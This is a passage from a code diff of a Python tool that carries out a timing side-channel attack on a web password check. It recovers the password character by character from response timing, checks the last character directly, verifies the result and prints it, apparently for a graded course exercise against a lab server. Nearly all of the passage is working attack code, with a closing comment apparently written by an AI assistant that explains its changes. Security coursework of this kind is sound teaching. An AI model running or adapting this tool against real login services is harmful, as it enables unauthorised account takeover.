+            logging.error(f"  Request failed for '{char}': {e}")
+
+    logging.error("[FAILED] No correct last character found")
+    return None
+
+
+# ============================================================================
+# MAIN CRACKING FUNCTION (based on your working code structure)
+# ============================================================================
+
+def crack_password(
+    url: str,
+    username: str,
+    password_length: int,
+    difficulty: int,
+    samples: int = 4,
+    resume_from: str = "",
+    use_threads: bool = True,
+    max_workers: int = 4
+) -> str:
+    """
+    Main password cracking function.
+    Based on your working crack_password_from_resuming logic.
+    """
+    current_password = resume_from
+    start_time = time.time()
+
+    logging.info("="*60)
+    logging.info("STARTING PASSWORD CRACK")
+    logging.info("="*60)
+    logging.info(f"Password length: {password_length}")
+    logging.info(f"Samples per char: {samples}")
+    logging.info(f"Threading: {'enabled' if use_threads else 'disabled'}")
+    if use_threads:
+        logging.info(f"Max workers: {max_workers}")
+    logging.info(f"Resume from: '{resume_from}' (length {len(resume_from)})")
+    logging.info("="*60)
+
+    # Crack each position
+    for position in range(len(resume_from) + 1, password_length + 1):
+        position_start = time.time()
+
+        logging.info(f"\n{'='*60}")
+        logging.info(f"Testing position {position}/{password_length}")
+        logging.info(f"Elapsed time so far: {time.time() - start_time:.2f}s")
+        logging.info(f"{'='*60}")
+
+        # Check if this is the last character
+        if position == password_length:
+            last_char = check_last_char(url, username, current_password, difficulty)
+            if last_char:
+                current_password += last_char
+                logging.info(f"\n[COMPLETE] Final password: '{current_password}'")
+                return current_password
+            else:
+                logging.error("[ERROR] Failed to find last character, using timing attack...")
+                # Fall through to timing attack
+
+        # Use timing attack for this position
+        best_char = crack_character_at_position(
+            url, username, current_password, position, password_length,
+            difficulty, samples, use_threads, max_workers
+        )
+
+        current_password += best_char
+
+        position_time = time.time() - position_start
+        logging.info(f"\n[Progress] Current password: '{current_password}' ({len(current_password)}/{password_length})")
+        logging.info(f"           Position cracked in {position_time:.2f}s")
+
     total_time = time.time() - start_time
 
-    # Count confidence levels
-    high_conf = sum(1 for r in position_results if r.confidence == "HIGH")
-    med_conf = sum(1 for r in position_results if r.confidence == "MEDIUM")
-    low_conf = sum(1 for r in position_results if r.confidence == "LOW")
-
     logging.info(f"\n{'='*60}")
-    logging.info(f"ATTACK SUMMARY")
+    logging.info(f"ATTACK COMPLETE")
     logging.info(f"{'='*60}")
-    logging.info(f"Username:        {username}")
-    logging.info(f"Difficulty:      {difficulty}")
-    logging.info(f"Password Length: {password_length}")
-    logging.info(f"Password Result: {known_password}")
-    logging.info(f"Total Time:      {total_time:.2f} seconds ({total_time/60:.2f} minutes)")
-    logging.info(f"Threads Used:    {threads}")
-    logging.info(f"Base Samples:    {base_samples}")
-    logging.info(f"")
-    logging.info(f"Confidence Distribution:")
-    logging.info(f"  HIGH:   {high_conf}/{password_length} positions ({high_conf/password_length*100:.1f}%)")
-    logging.info(f"  MEDIUM: {med_conf}/{password_length} positions ({med_conf/password_length*100:.1f}%)")
-    logging.info(f"  LOW:    {low_conf}/{password_length} positions ({low_conf/password_length*100:.1f}%)")
-
-    if low_conf > password_length * 0.5:
-        logging.warning(f"")
-        logging.warning(f"[!] WARNING: More than 50% positions had LOW confidence!")
-        logging.warning(f"[!] This typically happens on local Docker due to very small timing differences.")
-        logging.warning(f"[!] Recommendations:")
-        logging.warning(f"    - Increase --samples to 50-80 for better accuracy")
-        logging.warning(f"    - Verify the result against the server")
-        logging.warning(f"    - If incorrect, try running with --samples 80")
-
+    logging.info(f"Final password: {current_password}")
+    logging.info(f"Total time: {total_time:.2f}s ({total_time/60:.2f} minutes)")
     logging.info(f"{'='*60}")
 
-    # Log per-position details
-    logging.info(f"\n{'='*60}")
-    logging.info(f"PER-POSITION DETAILED RESULTS")
-    logging.info(f"{'='*60}")
-    for result in position_results:
-        logging.info(f"Position {result.position + 1:2d}: '{result.character}' | "
-                    f"Confidence: {result.confidence:8s} | "
-                    f"Z-score: {result.timing_result.z_score:5.2f} | "
-                    f"Median: {result.timing_result.median:.6f}s | "
-                    f"Samples: {result.timing_result.samples}")
-    logging.info(f"{'='*60}")
+    return current_password
 
-    return known_password
+
+# ============================================================================
+# VERIFICATION
+# ============================================================================
+
+def verify_password(url: str, username: str, password: str, difficulty: int) -> bool:
+    """Verify if a password is correct."""
+    logging.info(f"\n[*] Verifying password: '{password}'")
+
+    session = get_thread_session()
+    params = {
+        'user': username,
+        'password': password,
+        'difficulty': difficulty
+    }
+
+    try:
+        response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)
+        response_text = response.text.strip()
+
+        if response_text == "1":
+            logging.info("[SUCCESS] Password verified!")
+            return True
+        else:
+            logging.error(f"[FAILED] Verification failed. Response: '{response_text}'")
+            return False
+
+    except Exception as e:
+        logging.error(f"[ERROR] Verification request failed: {e}")
+        return False
 
 
 # ============================================================================
@@ -933,86 +446,36 @@ def crack_password(
 # ============================================================================
 
 def parse_arguments() -> argparse.Namespace:
-    """
-    Parse command line arguments.
-
-    Returns:
-        Parsed arguments namespace
-    """
+    """Parse command line arguments."""
     parser = argparse.ArgumentParser(
-        description="Timing Side-Channel Attack on Password Verification",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  python timing_attack.py --username 123456789
-  python timing_attack.py --username 123456789 --difficulty 2 --threads 8
-  python timing_attack.py --server http://132.72.81.37 --username 123456789
-        """
+        description="Timing Side-Channel Attack - Simplified Multi-Threaded",
+        formatter_class=argparse.RawDescriptionHelpFormatter
     )
 
-    parser.add_argument(
-        '--username',
-        type=str,
-        default=DEFAULT_USERNAME,
-        help=f'Username (student ID) to attack (default: {DEFAULT_USERNAME})'
-    )
-
-    parser.add_argument(
-        '--difficulty',
-        type=int,
-        default=DEFAULT_DIFFICULTY,
-        help=f'Difficulty level (default: {DEFAULT_DIFFICULTY})'
-    )
-
-    parser.add_argument(
-        '--server',
-        type=str,
-        default=DEFAULT_SERVER,
-        help=f'Server URL (default: {DEFAULT_SERVER})'
-    )
-
-    parser.add_argument(
-        '--port',
-        type=int,
-        default=DEFAULT_PORT,
-        help=f'Server port (default: {DEFAULT_PORT})'
-    )
-
-    parser.add_argument(
-        '--threads',
-        type=int,
-        default=DEFAULT_THREADS,
-        help=f'Number of parallel threads (default: {DEFAULT_THREADS})'
-    )
-
-    parser.add_argument(
-        '--samples',
-        type=int,
-        default=DEFAULT_BASE_SAMPLES,
-        help=f'Base number of timing samples per character (default: {DEFAULT_BASE_SAMPLES})'
-    )
-
-    parser.add_argument(
-        '--length',
-        type=int,
-        default=None,
-        help='Manually specify password length (skip auto-detection)'
-    )
-
-    parser.add_argument(
-        '--test-method',
-        type=str,
-        default=DEFAULT_STAT_TEST,
-        choices=['z-score', 't-test'],
-        help=f'Statistical test method: z-score or t-test (default: {DEFAULT_STAT_TEST})'
-    )
+    parser.add_argument('--username', type=str, default=DEFAULT_USERNAME,
+                       help=f'Username (default: {DEFAULT_USERNAME})')
+    parser.add_argument('--difficulty', type=int, default=DEFAULT_DIFFICULTY,
+                       help=f'Difficulty level (default: {DEFAULT_DIFFICULTY})')
+    parser.add_argument('--server', type=str, default=DEFAULT_SERVER,
+                       help=f'Server URL (default: {DEFAULT_SERVER})')
+    parser.add_argument('--port', type=int, default=DEFAULT_PORT,
+                       help=f'Server port (default: {DEFAULT_PORT})')
+    parser.add_argument('--samples', type=int, default=DEFAULT_BASE_SAMPLES,
+                       help=f'Samples per character (default: {DEFAULT_BASE_SAMPLES})')
+    parser.add_argument('--length', type=int, default=None,
+                       help='Password length (required if not auto-detecting)')
+    parser.add_argument('--detect-length', action='store_true',
+                       help='Auto-detect password length')
+    parser.add_argument('--resume', type=str, default="",
+                       help='Resume from partial password (e.g., "abc")')
+    parser.add_argument('--threads', type=int, default=DEFAULT_THREADS,
+                       help=f'Number of threads (0=sequential, default: {DEFAULT_THREADS})')
 
     return parser.parse_args()
 
 
 def main():
-    """Main entry point for the script."""
-    # Fix Windows console encoding issues
+    """Main entry point."""
     import sys
     import io
     if sys.platform == 'win32':
@@ -1021,7 +484,7 @@ def main():
 
     args = parse_arguments()
 
-    # Construct full URL
+    # Construct URL
     url = f"{args.server}:{args.port}" if args.port != 80 else args.server
     if not url.startswith('http'):
         url = f"http://{url}"
@@ -1030,41 +493,77 @@ def main():
     log_file = setup_logging(args.username)
 
     logging.info("="*60)
-    logging.info("TIMING SIDE-CHANNEL ATTACK")
+    logging.info("TIMING SIDE-CHANNEL ATTACK - SIMPLIFIED")
     logging.info("="*60)
     logging.info(f"Target URL:  {url}")
     logging.info(f"Username:    {args.username}")
     logging.info(f"Difficulty:  {args.difficulty}")
-    logging.info(f"Threads:     {args.threads}")
     logging.info(f"Samples:     {args.samples}")
-    logging.info(f"Test Method: {args.test_method}")
+    logging.info(f"Threads:     {args.threads if args.threads > 0 else 'Sequential'}")
     logging.info(f"Log file:    {log_file}")
     logging.info("="*60 + "\n")
 
     try:
-        # Run the attack
+        # Detect or use specified length
+        if args.detect_length:
+            password_length = detect_password_length(
+                url, args.username, args.difficulty
+            )
+        elif args.length:
+            password_length = args.length
+            logging.info(f"[*] Using specified password length: {password_length}")
+        else:
+            logging.error("[ERROR] Must specify --length or use --detect-length")
+            sys.exit(1)
+
+        # Crack password
+        use_threads = args.threads > 0
         password = crack_password(
             url=url,
             username=args.username,
+            password_length=password_length,
             difficulty=args.difficulty,
-            threads=args.threads,
-            base_samples=args.samples,
-            manual_length=args.length,
-            test_method=args.test_method
+            samples=args.samples,
+            resume_from=args.resume,
+            use_threads=use_threads,
+            max_workers=args.threads if use_threads else 1
         )
 
-        # Output ONLY the password to stdout (for grading)
+        # Verify
+        verify_password(url, args.username, password, args.difficulty)
+
+        # Output only password to stdout (for grading)
         print(password)
 
     except KeyboardInterrupt:
-        logging.error("\n[!] Attack interrupted by user")
+        logging.error("\n[!] Interrupted by user")
         sys.exit(1)
 
     except Exception as e:
-        logging.error(f"\n[!] Unexpected error: {e}")
-        logging.exception("Full traceback:")
+        logging.error(f"\n[!] Error: {e}")
+        logging.exception("Traceback:")
         sys.exit(1)
 
 
 if __name__ == "__main__":
     main()
+
+'''
+**Key Changes Based on Your Working Code:**
+
+1. **Simple Sum-and-Average** (like yours):
+   - No fancy statistics, outlier filtering, or z-scores
+   - Just sum up all sample times and divide by sample count
+   - Sort by average time (descending)
+
+2. **Using `response.elapsed.total_seconds()`** (like yours):
+   - More reliable than `perf_counter()`
+   - This is what requests library reports
+
+3. **Enhanced Logging** (as you requested):
+```
+   Sample 1/4 for 'a': 0.012345s (running total: 0.012345s, running avg: 0.012345s)
+   Sample 2/4 for 'a': 0.013456s (running total: 0.025801s, running avg: 0.012901s)
+   ...
+   Finished testing 'a': total=0.051234s, avg=0.012809s
+'''
